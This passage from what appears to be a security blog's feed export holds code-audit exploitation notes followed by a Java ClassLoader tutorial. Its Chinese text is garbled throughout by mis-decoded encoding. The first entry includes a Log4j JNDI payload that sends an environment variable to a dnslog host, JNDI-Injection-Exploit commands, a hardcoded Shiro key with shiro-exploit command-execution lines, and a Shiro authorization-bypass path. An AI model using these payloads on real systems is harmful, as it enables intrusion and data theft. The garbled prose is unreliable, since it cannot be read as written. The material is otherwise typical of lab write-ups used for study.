src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246149359-e5c5cd62-aeab-4dbd-9ac0-e501c8c6b043.png"></p><p>è‡ªå¸¦æ–¹æ³•è·å–æ–‡ä»¶ågetOriginalFilename</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246130966-45676b2d-6d06-47b8-8314-505d73b4518e.png"></p><p>ç›´æ¥è®¿é—®è·¯ç”±ä¸è¡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246296916-211f7537-a4db-490b-9297-dc174bee61e9.png"></p><p>æ ¹æ®æ–¹æ³•åï¼ŒçŒœæµ‹è¿™é‡ŒæŠ“ä¸ªåŒ…</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246329431-ce34bda2-a214-4c0a-bf56-0ca891d600db.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246398286-ce03de84-40f5-45d2-a823-bfb10045a853.png"></p><p>æ§åˆ¶è¿™é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246475774-6898fd4a-a39d-432c-b4e4-89297381c25a.png"></p><p>${jndi:ldap:&#x2F;&#x2F;${env:OS}.vc8yl8.dnslog.cn}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246573120-91bb2105-35a1-4084-bb1a-90065c757703.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246599154-711174ff-3766-4002-84e1-e5cb323c44c3.png"></p><p>å°è¯•æˆåŠŸç›´æ¥ä¸Šå·¥å…·java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -Câ€calcâ€</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246729108-7c66ba42-b67b-4877-bb7c-85f84bcbc40b.png"></p><p>ç›´æ¥åˆ©ç”¨</p><h3 id="Ruoyi-Shiro1-4-2"><a href="#Ruoyi-Shiro1-4-2" class="headerlink" title="Ruoyi-Shiro1.4.2"></a>Ruoyi-Shiro1.4.2</h3><p>4.2ç‰ˆæœ¬</p><h4 id="1ã€ååºåˆ—åŒ–ï¼š"><a href="#1ã€ååºåˆ—åŒ–ï¼š" class="headerlink" title="1ã€ååºåˆ—åŒ–ï¼š"></a>1ã€ååºåˆ—åŒ–ï¼š</h4><p>setCipherKey-&gt;fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</p><p><a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></p><p>python shiro-exploit.py check -u <a href="http://192.168.1.2/">http://192.168.1.2/</a></p><p>python shiro-exploit.py echo -g CommonsCollectionsK1-u <a href="http://192.168.1.2/-v">http://192.168.1.2/-v</a> 2 -k fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;-c whoami</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296800167-4b477b8c-0de6-450a-8333-494f877f4c73.png"></p><p>æºç å¯†é’¥ä½ç½®setCipherKey   fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296923275-cf70b98e-8b6c-404c-97ff-1f2073a35059.png"></p><p>python3 shiro-exploit.py check -u <a href="http://10.211.55.3:82/">http://10.211.55.3:82/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719313653902-877d5b02-3f68-40b3-a163-998a76cff2e0.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314723527-305b1dca-339e-40c2-b3a6-6c7352b2eb49.png"></p><p>python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u <a href="http://10.211.55.3:82/">http://10.211.55.3:82/</a> -v 2 -k fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D; -c whoami</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314772637-5e1ddc13-434f-423f-bdc6-d229155a97cd.png"></p><h4 id="2ã€æƒé™ç»•è¿‡ï¼š"><a href="#2ã€æƒé™ç»•è¿‡ï¼š" class="headerlink" title="2ã€æƒé™ç»•è¿‡ï¼š"></a>2ã€æƒé™ç»•è¿‡ï¼š</h4><p>-anonä¸ºåŒ¿åæ‹¦æˆªå™¨ï¼Œä¸éœ€è¦ç™»å½•å°±èƒ½è®¿é—®ï¼Œä¸€èˆ¬ç”¨äºé™æ€èµ„æº,æˆ–è€…ç§»åŠ¨ç«¯æ¥å£</p><p>-authcä¸ºç™»å½•æ‹¦æˆªå™¨ï¼Œéœ€è¦ç™»å½•è®¤è¯æ‰èƒ½è®¿é—®çš„èµ„æºã€‚</p><p>ä¾‹å­ï¼š</p><p>[urls]</p><p>&#x2F;index.html &#x3D; anon å…è®¸è®¿é—®</p><p>&#x2F;user&#x2F;** &#x3D; authc éœ€è¦éªŒè¯</p><p>shiroåŒ¹é…è§„åˆ™</p><p>?ï¼šåŒ¹é…ä¸€ä¸ªå­—ç¬¦<br>*ï¼šåŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²</p><p>**ï¼šåŒ¹é…è·¯å¾„ä¸­çš„é›¶ä¸ªæˆ–å¤šä¸ªè·¯å¾„</p><p>é…ç½®ï¼šcom&#x2F;ruoyi&#x2F;framework&#x2F;config&#x2F;ShiroConfig.java</p><p>ç»•è¿‡ï¼š<a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p><p>æµ‹è¯•ï¼š&#x2F;ajax;&#x2F;..&#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;1.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719901361541-5d1239ac-11ef-4d8b-bcde-a4dde3a50ed8.png"></p><h3 id="Halo-H2database-1-4-197"><a href="#Halo-H2database-1-4-197" class="headerlink" title="Halo-H2database 1.4.197"></a>Halo-H2database 1.4.197</h3><p>H2database-&gt;application.yaml-&gt;web-allow-others: true</p><p>javax.naming.InitialContext</p><p>ldap:&#x2F;&#x2F;192.168.139.1:1389&#x2F;5eebf8</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C â€œcalcâ€</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719902822307-4b31629b-d9ca-467c-b41b-ff5c9166acb8.png"></p><p>æ•°æ®åº“åœ°å€</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903123962-09d94779-2740-4ec9-8bbc-417e2910f3a1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903155176-abc5662c-5dbd-4bbf-af2d-b8ae90a3a8cf.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903732471-1dbdb7c7-ef8a-4462-8aca-4da6910acb4c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904062962-36b60d1b-2b75-4f76-aa35-40a96e4ced7d.png"></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ClassLoader</title>
      <link href="/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
      <url>/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="ç±»åŠ è½½æœºåˆ¶"><a href="#ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="ç±»åŠ è½½æœºåˆ¶"></a>ç±»åŠ è½½æœºåˆ¶</h3><p>ä¸Šé¢è¯´åˆ°äº†javaå­—èŠ‚ç ï¼Œä¸‹é¢æ˜¯å¯¹ç±»åŠ è½½è¿‡ç¨‹çš„ä»‹ç»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742453862839-6e2f690c-bb99-4db3-a9d1-7b59b67a0ec4.png"></p><p>ç±»ä»è¢«åŠ è½½åˆ° JVM å¼€å§‹ï¼Œåˆ°å¸è½½å‡ºå†…å­˜ï¼Œæ•´ä¸ªç”Ÿå‘½å‘¨æœŸåˆ†ä¸ºä¸ƒä¸ªé˜¶æ®µï¼Œåˆ†åˆ«æ˜¯åŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æã€åˆå§‹åŒ–ã€ä½¿ç”¨å’Œå¸è½½ã€‚å…¶ä¸­éªŒè¯ã€å‡†å¤‡å’Œè§£æè¿™ä¸‰ä¸ªé˜¶æ®µç»Ÿç§°ä¸ºè¿æ¥ã€‚</p><p>é™¤å»ä½¿ç”¨å’Œå¸è½½ï¼Œå°±æ˜¯ Java çš„ç±»åŠ è½½è¿‡ç¨‹ã€‚è¿™ 5 ä¸ªé˜¶æ®µä¸€èˆ¬æ˜¯é¡ºåºå‘ç”Ÿçš„ï¼Œä½†åœ¨åŠ¨æ€ç»‘å®šçš„æƒ…å†µä¸‹ï¼Œè§£æé˜¶æ®µå‘ç”Ÿåœ¨åˆå§‹åŒ–é˜¶æ®µä¹‹åï¼ˆæˆ‘ä»¬éšåæ¥è§£é‡Šï¼‰ã€‚</p><h4 id="Loadingï¼ˆè½½å…¥ï¼‰"><a href="#Loadingï¼ˆè½½å…¥ï¼‰" class="headerlink" title="Loadingï¼ˆè½½å…¥ï¼‰"></a>Loadingï¼ˆè½½å…¥ï¼‰</h4><p>ç±»åŠ è½½è¿‡ç¨‹çš„ç¬¬ä¸€æ­¥ï¼Œä¸»è¦å®Œæˆä¸‹é¢ 3 ä»¶äº‹æƒ…ï¼š</p><ol><li>é€šè¿‡å…¨ç±»åè·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµã€‚</li><li>å°†å­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬æ¢ä¸ºæ–¹æ³•åŒºçš„è¿è¡Œæ—¶æ•°æ®ç»“æ„ã€‚</li><li>åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„ <code>Class</code> å¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™äº›æ•°æ®çš„è®¿é—®å…¥å£ã€‚</li></ol><p>è™šæ‹Ÿæœºè§„èŒƒä¸Šé¢è¿™ 3 ç‚¹å¹¶ä¸å…·ä½“ï¼Œå› æ­¤æ˜¯éå¸¸çµæ´»çš„ã€‚æ¯”å¦‚ï¼šâ€é€šè¿‡å…¨ç±»åè·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµâ€ å¹¶æ²¡æœ‰æŒ‡æ˜å…·ä½“ä»å“ªé‡Œè·å–ï¼ˆ <code>ZIP</code>ã€ <code>JAR</code>ã€<code>EAR</code>ã€<code>WAR</code>ã€ç½‘ç»œã€åŠ¨æ€ä»£ç†æŠ€æœ¯è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆã€å…¶ä»–æ–‡ä»¶ç”Ÿæˆæ¯”å¦‚ <code>JSP</code>â€¦ï¼‰ã€æ€æ ·è·å–ã€‚</p><p>åŠ è½½è¿™ä¸€æ­¥ä¸»è¦æ˜¯é€šè¿‡æˆ‘ä»¬åé¢è¦è®²åˆ°çš„ <strong>ç±»åŠ è½½å™¨</strong> å®Œæˆçš„ã€‚ç±»åŠ è½½å™¨æœ‰å¾ˆå¤šç§ï¼Œå½“æˆ‘ä»¬æƒ³è¦åŠ è½½ä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œå…·ä½“æ˜¯å“ªä¸ªç±»åŠ è½½å™¨åŠ è½½ç”± <strong>åŒäº²å§”æ´¾æ¨¡å‹</strong> å†³å®šï¼ˆä¸è¿‡ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹ï¼‰ã€‚</p><p>æ¯ä¸ª Java ç±»éƒ½æœ‰ä¸€ä¸ªå¼•ç”¨æŒ‡å‘åŠ è½½å®ƒçš„ <code>ClassLoader</code>ã€‚ä¸è¿‡ï¼Œæ•°ç»„ç±»ä¸æ˜¯é€šè¿‡ <code>ClassLoader</code> åˆ›å»ºçš„ï¼Œè€Œæ˜¯ JVM åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºçš„ï¼Œæ•°ç»„ç±»é€šè¿‡<code>getClassLoader()</code>æ–¹æ³•è·å– <code>ClassLoader</code> çš„æ—¶å€™å’Œè¯¥æ•°ç»„çš„å…ƒç´ ç±»å‹çš„ <code>ClassLoader</code> æ˜¯ä¸€è‡´çš„ã€‚</p><p>ä¸€ä¸ªéæ•°ç»„ç±»çš„åŠ è½½é˜¶æ®µï¼ˆåŠ è½½é˜¶æ®µè·å–ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµçš„åŠ¨ä½œï¼‰æ˜¯å¯æ§æ€§æœ€å¼ºçš„é˜¶æ®µï¼Œè¿™ä¸€æ­¥æˆ‘ä»¬å¯ä»¥å»å®Œæˆè¿˜å¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»æ§åˆ¶å­—èŠ‚æµçš„è·å–æ–¹å¼ï¼ˆé‡å†™ä¸€ä¸ªç±»åŠ è½½å™¨çš„ <code>loadClass()</code> æ–¹æ³•ï¼‰ã€‚</p><p>åŠ è½½é˜¶æ®µä¸è¿æ¥é˜¶æ®µçš„éƒ¨åˆ†åŠ¨ä½œ(å¦‚ä¸€éƒ¨åˆ†å­—èŠ‚ç æ–‡ä»¶æ ¼å¼éªŒè¯åŠ¨ä½œ)æ˜¯äº¤å‰è¿›è¡Œçš„ï¼ŒåŠ è½½é˜¶æ®µå°šæœªç»“æŸï¼Œè¿æ¥é˜¶æ®µå¯èƒ½å°±å·²ç»å¼€å§‹äº†ã€‚</p><h4 id="Verificationï¼ˆéªŒè¯ï¼‰"><a href="#Verificationï¼ˆéªŒè¯ï¼‰" class="headerlink" title="Verificationï¼ˆéªŒè¯ï¼‰"></a>Verificationï¼ˆéªŒè¯ï¼‰</h4><p><strong>éªŒè¯æ˜¯è¿æ¥é˜¶æ®µçš„ç¬¬ä¸€æ­¥ï¼Œè¿™ä¸€é˜¶æ®µçš„ç›®çš„æ˜¯ç¡®ä¿ Class æ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆã€ŠJava è™šæ‹Ÿæœºè§„èŒƒã€‹çš„å…¨éƒ¨çº¦æŸè¦æ±‚ï¼Œä¿è¯è¿™äº›ä¿¡æ¯è¢«å½“ä½œä»£ç è¿è¡Œåä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚</strong></p><p>éªŒè¯é˜¶æ®µè¿™ä¸€æ­¥åœ¨æ•´ä¸ªç±»åŠ è½½è¿‡ç¨‹ä¸­è€—è´¹çš„èµ„æºè¿˜æ˜¯ç›¸å¯¹è¾ƒå¤šçš„ï¼Œä½†å¾ˆæœ‰å¿…è¦ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚ä»»ä½•æ—¶å€™ï¼Œç¨‹åºå®‰å…¨éƒ½æ˜¯ç¬¬ä¸€ä½ã€‚</p><p>ä¸è¿‡ï¼ŒéªŒè¯é˜¶æ®µä¹Ÿä¸æ˜¯å¿…é¡»è¦æ‰§è¡Œçš„é˜¶æ®µã€‚å¦‚æœç¨‹åºè¿è¡Œçš„å…¨éƒ¨ä»£ç (åŒ…æ‹¬è‡ªå·±ç¼–å†™çš„ã€ç¬¬ä¸‰æ–¹åŒ…ä¸­çš„ã€ä»å¤–éƒ¨åŠ è½½çš„ã€åŠ¨æ€ç”Ÿæˆçš„ç­‰æ‰€æœ‰ä»£ç )éƒ½å·²ç»è¢«åå¤ä½¿ç”¨å’ŒéªŒè¯è¿‡ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒçš„å®æ–½é˜¶æ®µå°±å¯ä»¥è€ƒè™‘ä½¿ç”¨ <code>-Xverify:none</code> å‚æ•°æ¥å…³é—­å¤§éƒ¨åˆ†çš„ç±»éªŒè¯æªæ–½ï¼Œä»¥ç¼©çŸ­è™šæ‹Ÿæœºç±»åŠ è½½çš„æ—¶é—´ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ <code>-Xverify:none</code> å’Œ <code>-noverify</code> åœ¨ JDK 13 ä¸­è¢«æ ‡è®°ä¸º deprecated ï¼Œåœ¨æœªæ¥ç‰ˆæœ¬çš„ JDK ä¸­å¯èƒ½ä¼šè¢«ç§»é™¤ã€‚</p><p>éªŒè¯é˜¶æ®µä¸»è¦ç”±å››ä¸ªæ£€éªŒé˜¶æ®µç»„æˆï¼š</p><ol><li>æ–‡ä»¶æ ¼å¼éªŒè¯ï¼ˆClass æ–‡ä»¶æ ¼å¼æ£€æŸ¥ï¼‰</li><li>å…ƒæ•°æ®éªŒè¯ï¼ˆå­—èŠ‚ç è¯­ä¹‰æ£€æŸ¥ï¼‰</li><li>å­—èŠ‚ç éªŒè¯ï¼ˆç¨‹åºè¯­ä¹‰æ£€æŸ¥ï¼‰</li><li>ç¬¦å·å¼•ç”¨éªŒè¯ï¼ˆç±»çš„æ­£ç¡®æ€§æ£€æŸ¥</li></ol><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742520156073-1d90d6b3-2b9d-4e87-bd2d-faf8c8de8cf9.png"></p><h4 id="Preparationï¼ˆå‡†å¤‡ï¼‰"><a href="#Preparationï¼ˆå‡†å¤‡ï¼‰" class="headerlink" title="Preparationï¼ˆå‡†å¤‡ï¼‰"></a>Preparationï¼ˆå‡†å¤‡ï¼‰</h4><p><strong>å‡†å¤‡é˜¶æ®µæ˜¯æ­£å¼ä¸ºç±»å˜é‡åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡åˆå§‹å€¼çš„é˜¶æ®µ</strong>ï¼Œè¿™äº›å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­åˆ†é…ã€‚å¯¹äºè¯¥é˜¶æ®µæœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ol><li>è¿™æ—¶å€™è¿›è¡Œå†…å­˜åˆ†é…çš„ä»…åŒ…æ‹¬ç±»å˜é‡ï¼ˆ Class Variables ï¼Œå³é™æ€å˜é‡ï¼Œè¢« <code>static</code> å…³é”®å­—ä¿®é¥°çš„å˜é‡ï¼Œåªä¸ç±»ç›¸å…³ï¼Œå› æ­¤è¢«ç§°ä¸ºç±»å˜é‡ï¼‰ï¼Œè€Œä¸åŒ…æ‹¬å®ä¾‹å˜é‡ã€‚å®ä¾‹å˜é‡ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€å—åˆ†é…åœ¨ Java å †ä¸­ã€‚</li><li>ä»æ¦‚å¿µä¸Šè®²ï¼Œç±»å˜é‡æ‰€ä½¿ç”¨çš„å†…å­˜éƒ½åº”å½“åœ¨ <strong>æ–¹æ³•åŒº</strong> ä¸­è¿›è¡Œåˆ†é…ã€‚ä¸è¿‡æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼šJDK 7 ä¹‹å‰ï¼ŒHotSpot ä½¿ç”¨æ°¸ä¹…ä»£æ¥å®ç°æ–¹æ³•åŒºçš„æ—¶å€™ï¼Œå®ç°æ˜¯å®Œå…¨ç¬¦åˆè¿™ç§é€»è¾‘æ¦‚å¿µçš„ã€‚ è€Œåœ¨ JDK 7 åŠä¹‹åï¼ŒHotSpot å·²ç»æŠŠåŸæœ¬æ”¾åœ¨æ°¸ä¹…ä»£çš„å­—ç¬¦ä¸²å¸¸é‡æ± ã€é™æ€å˜é‡ç­‰ç§»åŠ¨åˆ°å †ä¸­ï¼Œè¿™ä¸ªæ—¶å€™ç±»å˜é‡åˆ™ä¼šéšç€ Class å¯¹è±¡ä¸€èµ·å­˜æ”¾åœ¨ Java å †ä¸­ã€‚ç›¸å…³é˜…è¯»ï¼š<a href="https://github.com/fenixsoft/jvm_book/issues/75">ã€Šæ·±å…¥ç†è§£ Java è™šæ‹Ÿæœºï¼ˆç¬¬ 3 ç‰ˆï¼‰ã€‹å‹˜è¯¯#75</a></li><li>è¿™é‡Œæ‰€è®¾ç½®çš„åˆå§‹å€¼â€é€šå¸¸æƒ…å†µâ€ä¸‹æ˜¯æ•°æ®ç±»å‹é»˜è®¤çš„é›¶å€¼ï¼ˆå¦‚ 0ã€0Lã€nullã€false ç­‰ï¼‰ï¼Œæ¯”å¦‚æˆ‘ä»¬å®šä¹‰äº†<code>public static int value=111</code> ï¼Œé‚£ä¹ˆ value å˜é‡åœ¨å‡†å¤‡é˜¶æ®µçš„åˆå§‹å€¼å°±æ˜¯ 0 è€Œä¸æ˜¯ 111ï¼ˆåˆå§‹åŒ–é˜¶æ®µæ‰ä¼šèµ‹å€¼ï¼‰ã€‚ç‰¹æ®Šæƒ…å†µï¼šæ¯”å¦‚ç»™ value å˜é‡åŠ ä¸Šäº† final å…³é”®å­—<code>public static final int value=111</code> ï¼Œé‚£ä¹ˆå‡†å¤‡é˜¶æ®µ value çš„å€¼å°±è¢«èµ‹å€¼ä¸º 111ã€‚</li></ol><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742520257749-011c36aa-1d6e-43bf-bf28-51d46259753b.png"></p><h4 id="Resolutionï¼ˆè§£æï¼‰"><a href="#Resolutionï¼ˆè§£æï¼‰" class="headerlink" title="Resolutionï¼ˆè§£æï¼‰"></a>Resolutionï¼ˆè§£æï¼‰</h4><p>è¯¥é˜¶æ®µå°†å¸¸é‡æ± ä¸­çš„ç¬¦å·å¼•ç”¨è½¬åŒ–ä¸ºç›´æ¥å¼•ç”¨ã€‚è¿™é‡Œå°±ç‰µå¼•å‡ºæ¥é—®é¢˜äº†ï¼Œä»€ä¹ˆæ˜¯ç¬¦å·å¼•ç”¨ï¼Ÿä»€ä¹ˆæ˜¯ç›´æ¥å¼•ç”¨ï¼Ÿ</p><p><strong>ç¬¦å·å¼•ç”¨</strong>ä»¥ä¸€ç»„ç¬¦å·ï¼ˆä»»ä½•å½¢å¼çš„å­—é¢é‡ï¼Œåªè¦åœ¨ä½¿ç”¨æ—¶èƒ½å¤Ÿæ— æ­§ä¹‰çš„å®šä½åˆ°ç›®æ ‡å³å¯ï¼‰æ¥æè¿°æ‰€å¼•ç”¨çš„ç›®æ ‡ã€‚</p><p>åœ¨ç¼–è¯‘æ—¶ï¼ŒJava ç±»å¹¶ä¸çŸ¥é“æ‰€å¼•ç”¨çš„ç±»çš„å®é™…åœ°å€ï¼Œå› æ­¤åªèƒ½ä½¿ç”¨ç¬¦å·å¼•ç”¨æ¥ä»£æ›¿ã€‚æ¯”å¦‚ <code>com.Wanger</code> ç±»å¼•ç”¨äº† <code>com.Chenmo</code> ç±»ï¼Œç¼–è¯‘æ—¶ Wanger ç±»å¹¶ä¸çŸ¥é“ Chenmo ç±»çš„å®é™…å†…å­˜åœ°å€ï¼Œå› æ­¤åªèƒ½ä½¿ç”¨ç¬¦å· <code>com.Chenmo</code>ã€‚</p><p><strong>ç›´æ¥å¼•ç”¨</strong>é€šè¿‡å¯¹ç¬¦å·å¼•ç”¨è¿›è¡Œè§£æï¼Œæ‰¾åˆ°å¼•ç”¨çš„å®é™…å†…å­˜åœ°å€ã€‚æˆ‘ä»¬å†æ¥å¯¹æ¯”è¯´æ˜ä¸€ä¸‹ã€‚</p><p><strong>ç¬¦å·å¼•ç”¨</strong></p><ul><li><strong>å®šä¹‰</strong>ï¼šåŒ…å«äº†ç±»ã€å­—æ®µã€æ–¹æ³•ã€æ¥å£ç­‰å¤šç§ç¬¦å·çš„å…¨é™å®šåã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šåœ¨ç¼–è¯‘æ—¶ç”Ÿæˆï¼Œå­˜å‚¨åœ¨ç¼–è¯‘åçš„<a href="https://javabetter.cn/jvm/class-file-jiegou.html">å­—èŠ‚ç æ–‡ä»¶</a>çš„å¸¸é‡æ± ä¸­ã€‚</li><li><strong>ç‹¬ç«‹æ€§</strong>ï¼šä¸ä¾èµ–äºå…·ä½“çš„å†…å­˜åœ°å€ï¼Œæä¾›äº†æ›´å¥½çš„çµæ´»æ€§ã€‚</li></ul><p><strong>ç›´æ¥å¼•ç”¨</strong></p><ul><li><strong>å®šä¹‰</strong>ï¼šç›´æ¥æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–è€…èƒ½é—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚</li><li><strong>ç‰¹ç‚¹</strong>ï¼šåœ¨è¿è¡Œæ—¶ç”Ÿæˆï¼Œä¾èµ–äºå…·ä½“çš„å†…å­˜å¸ƒå±€ã€‚</li><li><strong>æ•ˆç‡</strong>ï¼šç”±äºç›´æ¥æŒ‡å‘äº†å†…å­˜åœ°å€æˆ–è€…åç§»é‡ï¼Œæ‰€ä»¥é€šè¿‡ç›´æ¥å¼•ç”¨è®¿é—®å¯¹è±¡çš„æ•ˆç‡è¾ƒé«˜ã€‚</li></ul><p>è¿™ä¹ˆè¯´è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Œå…·ä½“ä¸¾ä¸ªä¾‹å­</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742520630029-1e880950-b5be-4f27-9512-f5b001113b7d.png"></p><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼š</p><ul><li><code>class A</code> å¼•ç”¨äº† <code>class B</code>ã€‚</li><li>åœ¨ç¼–è¯‘æ—¶ï¼Œè¿™ä¸ªå¼•ç”¨å˜æˆäº†ç¬¦å·å¼•ç”¨ï¼Œå­˜å‚¨åœ¨ <code>.class</code> æ–‡ä»¶çš„å¸¸é‡æ± ä¸­ã€‚</li><li>åœ¨è¿è¡Œæ—¶ï¼Œå½“ <code>class A</code> éœ€è¦ä½¿ç”¨ <code>class B</code> çš„æ—¶å€™ï¼ŒJVM ä¼šå°†ç¬¦å·å¼•ç”¨è§£æä¸ºç›´æ¥å¼•ç”¨ï¼ŒæŒ‡å‘å†…å­˜ä¸­çš„ <code>class B</code> å¯¹è±¡æˆ–å…¶å…ƒæ•°æ®ã€‚</li></ul><h4 id="Initializationï¼ˆåˆå§‹åŒ–ï¼‰"><a href="#Initializationï¼ˆåˆå§‹åŒ–ï¼‰" class="headerlink" title="Initializationï¼ˆåˆå§‹åŒ–ï¼‰"></a>Initializationï¼ˆåˆå§‹åŒ–ï¼‰</h4><p>è¯¥é˜¶æ®µæ˜¯ç±»åŠ è½½è¿‡ç¨‹çš„æœ€åä¸€æ­¥ã€‚åœ¨å‡†å¤‡é˜¶æ®µï¼Œç±»å˜é‡å·²ç»è¢«èµ‹è¿‡é»˜è®¤åˆå§‹å€¼ï¼Œè€Œåœ¨åˆå§‹åŒ–é˜¶æ®µï¼Œç±»å˜é‡å°†è¢«èµ‹å€¼ä¸ºä»£ç æœŸæœ›èµ‹çš„å€¼ã€‚æ¢å¥è¯è¯´ï¼Œåˆå§‹åŒ–é˜¶æ®µæ˜¯æ‰§è¡Œç±»æ„é€ å™¨æ–¹æ³•ï¼ˆjavapä¸­çœ‹åˆ°çš„ <code>&lt;clinit&gt;()</code> æ–¹æ³•ï¼‰çš„è¿‡ç¨‹ã€‚</p><p>ä¸Šé¢è¿™æ®µè¯å¯èƒ½è¯´å¾—å¾ˆæŠ½è±¡ï¼Œä¸å¥½ç†è§£ï¼Œæˆ‘æ¥ä¸¾ä¸ªä¾‹å­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String calm = new String(&quot;hhhh&quot;);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ®µä»£ç ä½¿ç”¨äº† <code>new</code> å…³é”®å­—æ¥å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨ String ç±»çš„æ„é€ æ–¹æ³•å¯¹ calm è¿›è¡Œå®ä¾‹åŒ–ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public String(String original) &#123;</span><br><span class="line">    this.value = original.value;</span><br><span 